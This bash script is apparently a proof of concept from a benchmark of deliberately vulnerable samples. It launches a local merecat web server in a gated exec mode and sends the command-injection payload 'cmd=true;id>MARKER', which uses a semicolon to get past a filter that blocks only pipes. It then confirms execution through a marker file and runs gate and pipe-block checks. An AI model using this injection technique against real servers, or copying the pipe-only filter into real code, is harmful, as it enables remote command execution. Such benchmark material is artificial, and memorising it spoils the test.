#!/usr/bin/env bash
# PoC for 056_merecat_C1I2S2
# Axes: C1 (single CLI flag gate) / I2 (buffered snprintf) / S2 (pipe blocked, semicolon bypass)
#
# Vulnerability: the handler blocks '|' but not ';'. The command is buffered
# through snprintf before reaching system(), but the semicolon bypass still works.
#
# Gate flag: --exec-mode
# Exploit payload: cmd=true;id>MARKER  (uses semicolon to chain commands)
#
# Usage: ./PoC.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/merecat"
WWWROOT="/tmp/poc_056_www"
MARKER="/tmp/poc_056_marker"
PORT=18056

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server ───────────────────────────────────────────────────────────────
echo "[*] starting merecat with --exec-mode on port $PORT..."
"$BINARY" -n -p "$PORT" "$WWWROOT" --exec-mode &
SERVER_PID=$!
sleep 2

# ── trigger: semicolon bypass ──────────────────────────────────────────────────
echo "[*] sending payload: cmd=true;id>$MARKER (semicolon bypasses pipe check)"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=true;id>${MARKER}" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── show that pipe is blocked ──────────────────────────────────────────────────
echo "[*] verifying S2: pipe character should return 403..."
HTTP_CODE=$(curl -sfg -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${PORT}/exec?cmd=id|tee/tmp/poc_056_pipe" || true)
if [[ "$HTTP_CODE" == "403" ]]; then
    echo "[+] S2 confirmed: pipe blocked with 403"
else
    echo "[!] unexpected S2 response: $HTTP_CODE"
fi

# ── negative control: endpoint absent without --exec-mode ──────────────────────
echo "[*] verifying gate: endpoint must be absent without --exec-mode..."
NEG_PORT=$((19000 + 56))
"$BINARY" -n -p $NEG_PORT "$WWWROOT" &
SAFE_PID=$!
sleep 2
HTTP_CODE=$(curl -sfg -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-mode"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
